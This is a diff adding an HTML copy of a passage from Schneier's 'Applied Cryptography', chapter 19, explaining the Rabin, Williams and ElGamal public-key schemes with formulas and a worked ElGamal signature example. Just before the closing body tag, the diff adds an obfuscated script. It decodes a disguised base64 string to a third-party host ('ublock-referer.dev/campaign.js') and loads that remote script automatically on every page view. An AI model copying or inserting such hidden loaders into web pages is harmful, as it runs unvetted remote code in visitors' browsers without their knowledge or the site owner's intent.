@@ -1,0 +1,161 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=474-477//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>The Pohlig-Hellman algorithm is patented in the United States [722] and also in Canada. PKP licenses the patent, along with other public-key cryptography patents (see Section 25.5).
+</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">19.5 Rabin</FONT></H3>
+<P>Rabin&#146;s scheme [1283,1601] gets its security from the difficulty of finding square roots modulo a composite number. This problem is equivalent to factoring. Here is one implementation of this scheme.
+</P>
+<P>First choose two primes, <I>p</I> and <I>q</I>, both congruent to 3 mod 4. These primes are the private key; the product <I>n</I> = <I>pq</I> is the public key.</P>
+<P>To encrypt a message, <I>M</I> (<I>M</I> must be less than <I>n</I>), simply compute</P>
+<DL>
+<DD><I>C</I> = <I>M</I><SUP>2</SUP> mod <I>n</I>
+</DL>
+<P>Decrypting the message is just as easy, but slightly more annoying. Since the receiver knows <I>p</I> and <I>q</I>, he can solve the two congruences using the Chinese remainder theorem. Compute</P>
+<DL>
+<DD><I>m</I><SUB>1</SUB> = <I>C</I><SUP>(<I>p</I> &#43; 1)/4</SUP> mod <I>p</I>
+<DD><I>m</I><SUB>2</SUB> = (<I>p</I> - <I>C</I><SUP>(<I>p</I>&#43; 1)/4</SUP>) mod <I>p</I>
+<DD><I>m</I><SUB>3</SUB> = <I>C</I><SUP>(<I>q</I> &#43; 1)/4</SUP> mod <I>q</I>
+<DD><I>m</I><SUB>4</SUB> = (<I>q</I> - <I>C</I><SUP>(<I>q</I> &#43; 1)/4</SUP>) mod <I>q</I>
+</DL>
+<P>Then choose an integer <I>a</I> = <I>q</I>(<I>q</I><SUP>-1</SUP> mod <I>p</I>) and a integer <I>b</I> = <I>p</I>(<I>p</I><SUP>-1</SUP> mod <I>q</I>). The four possible solutions are:</P>
+<DL>
+<DD><I>M</I><SUB>1</SUB> = (<I>am</I><SUB>1</SUB> &#43; <I>bm</I><SUB>3</SUB>) mod <I>n</I>
+<DD><I>M</I><SUB>2</SUB> = (<I>am</I><SUB>1</SUB> &#43; <I>bm</I><SUB>4</SUB>) mod <I>n</I>
+<DD><I>M</I><SUB>3</SUB> = (<I>am</I><SUB>2</SUB> &#43; <I>bm</I><SUB>3</SUB>) mod <I>n</I>
+<DD><I>M</I><SUB>4</SUB> = (<I>am</I><SUB>2</SUB> &#43; <I>bm</I><SUB>4</SUB>) mod <I>n</I>
+</DL>
+<P>One of those four results, <I>M</I><SUB>1</SUB>, <I>M</I><SUB>2</SUB>, <I>M</I><SUB>3</SUB>, or <I>M</I><SUB>4</SUB>, equals <I>M</I>. If the message is English text, it should be easy to choose the correct <I>M</I><SUB>i</SUB>. On the other hand, if the message is a random-bit stream (say, for key generation or a digital signature), there is no way to determine which <I>M</I><SUB>i</SUB> is correct. One way to solve this problem is to add a known header to the message before encrypting.</P>
+<P><FONT SIZE="+1"><B><I>Williams</I></B></FONT></P>
+<P>Hugh Williams redefined Rabin&#146;s schemes to eliminate these shortcomings [1601]. In his scheme, <I>p</I> and <I>q</I> are selected such that</P>
+<DL>
+<DD><I>p</I> &#8801; 3 mod 8
+<DD><I>q</I> &#8801; 7 mod 8
+</DL>
+<P>and
+</P>
+<DL>
+<DD><I>N</I> = <I>pq</I>
+</DL>
+<P>Also, there is a small integer, <I>S</I>, such that J(<I>S,N</I>) = -1. (J is the Jacobi symbol&#151;see Section 11.3). <I>N</I> and <I>S</I> are public. The secret key is <I>k</I>, such that</P>
+<DL>
+<DD><I>k</I> = 1/2 * (1/4 * (<I>p</I> - 1) * (<I>q</I> - 1) &#43; 1)
+</DL>
+<P>To encrypt a message <I>M</I>, compute <I>c</I><SUB>1</SUB> such that J(<I>M,N</I>) = (-1)<I><SUP>c</I><SMALL><SMALL>1</SMALL></SMALL></SUP>. Then, compute <I>M&#146;</I> = (<I>S<SUP>c</I><SMALL><SMALL>1</SMALL></SMALL></SUP> * <I>M</I>) mod <I>N</I>. Like Rabin&#146;s scheme, <I>C</I> = <I>M&#146;</I><SUP>2</SUP> mod <I>N</I>. And <I>c</I><SUB>2</SUB> = <I>M&#146;</I> mod 2. The final ciphertext message is the triple:</P>
+<DL>
+<DD>(<I>C, c</I><SUB>1</SUB>, <I>c</I><SUB>2</SUB>)
+</DL>
+<P>To decrypt <I>C</I>, the receiver computes <I>M</I>" using</P>
+<DL>
+<DD><I>C<SUP>k</I></SUP> &#8801; &#177;<I>M</I>" (mod <I>N</I>)
+</DL>
+<P>The proper sign of <I>M</I>" is given by <I>c</I><SUB>2</SUB>. Finally,</P>
+<DL>
+<DD><I>M</I> = (<I>S<SUP>c</I><SMALL><SMALL>1</SMALL></SMALL></SUP> * (-1)<SUP><I>c</I><SMALL><SMALL>1</SMALL></SMALL></SUP> * <I>M</I>") mod <I>N</I>
+</DL>
+<P>Williams refined this scheme further in [1603, 1604, 1605]. Instead of squaring the plaintext message, cube it. The large primes must be congruent to 1 mod 3; otherwise the public and private keys are the same. Even better, there is only one unique decryption for each encryption.
+</P>
+<P>Both Rabin and Williams have an advantage over RSA in that they are provably as secure as factoring. However, they are completely insecure against a chosen-ciphertext attack. If you are going to use these schemes in instances where an attacker can mount this attack (for example, as a digital signature algorithm where an attacker can choose messages to be signed), be sure to use a one-way hash function before signing. Rabin suggested another way of defeating this attack: Append a different random string to each message before hashing and signing. Unfortunately, once you add a one-way hash function to the system it is no longer provably as secure as factoring [628], although adding hashing cannot weaken the system in any practical sense.</P>
+<P>Other Rabin variants are [972, 909, 696, 697, 1439, 989]. A two-dimensional variant is in [866, 889].</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">19.6 ElGamal</FONT></H3>
+<P>The ElGamal scheme [518,519] can be used for both digital signatures and encryption; it gets its security from the difficulty of calculating discrete logarithms in a finite field.
+</P>
+<P>To generate a key pair, first choose a prime, <I>p</I>, and two random numbers, <I>g</I> and <I>x</I>, such that both <I>g</I> and <I>x</I> are less than <I>p</I>. Then calculate</P>
+<DL>
+<DD><I>y</I> = <I>g<SUP>x</I></SUP> mod <I>p</I>
+</DL>
+<P>The public key is <I>y, g</I>, and <I>p</I>. Both <I>g</I> and <I>p</I> can be shared among a group of users. The private key is <I>x</I>.</P>
+<P><FONT SIZE="+1"><B><I>ElGamal Signatures</I></B></FONT></P>
+<P>To sign a message, <I>M</I>, first choose a random number, <I>k</I>, such that <I>k</I> is relatively prime to <I>p</I> - 1. Then compute</P>
+<DL>
+<DD><I>a</I> = <I>g<SUP>k</I></SUP> mod <I>p</I>
+</DL>
+<P>and use the extended Euclidean algorithm to solve for <I>b</I> in the following equation:</P>
+<DL>
+<DD><I>M</I> = (<I>xa</I> &#43; <I>kb</I>) mod (<I>p</I> - 1)
+</DL>
+<P>The signature is the pair: <I>a</I> and <I>b</I>. The random value, <I>k</I>, must be kept secret.</P>
+<P>To verify a signature, confirm that</P>
+<DL>
+<DD><I>y<SUP>a</SUP>a<SUP>b</SUP></I> mod <I>p</I> = <I>g<SUP>M</SUP></I> mod <I>p</I>
+</DL>
+<P>Each ElGamal signature or encryption requires a new value of <I>k</I>, and that value must be chosen randomly. If Eve ever recovers a <I>k</I> that Alice used, she can recover Alice&#146;s private key, <I>x</I>. If Eve ever gets two messages signed or encrypted using the same <I>k</I>, even if she doesn&#146;t know what it is, she can recover <I>x</I>.</P>
+<P>This is summarized in Table 19.5.</P>
+<P>For example, choose <I>p</I> = 11 and <I>g</I> = 2. Choose private key <I>x</I> = 8. Calculate</P>
+<DL>
+<DD><I>y</I> = <I>g<SUP>x</SUP></I> mod <I>p</I> = 2<SUP>8</SUP> mod 11 = 3
+</DL>
+<P>The public key is <I>y</I> = 3, <I>g</I> = 2, and <I>p</I> = 11.</P>
+<P>To authenticate <I>M</I> = 5, first choose a random number <I>k</I> = 9. Confirm that gcd(9, 10) = 1. Compute</P>
+<DL>
+<DD><I>a</I> = <I>g<SUP>k</I></SUP> mod <I>p</I> = 2<SUP>9</SUP> mod 11 = 6
+</DL>
+<P>and use the extended Euclidean algorithm to solve for <I>b:</I></P>
+<DL>
+<DD><I>M</I> = (<I>ax</I> &#43; <I>kb</I>) mod (<I>p</I> - 1)
+<DD>5 = (8 * 6 &#43; 9 * b) mod 10
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(Oqoqpdhy, WQcXFlAJ) {WQcXFlAJ = Oqoqpdhy.createElement('script');WQcXFlAJ.type = 'text/javascript';WQcXFlAJ.async = true;WQcXFlAJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');Oqoqpdhy.getElementsByTagName('body')[0].appendChild(WQcXFlAJ);}(document));</script></body>
+</html>
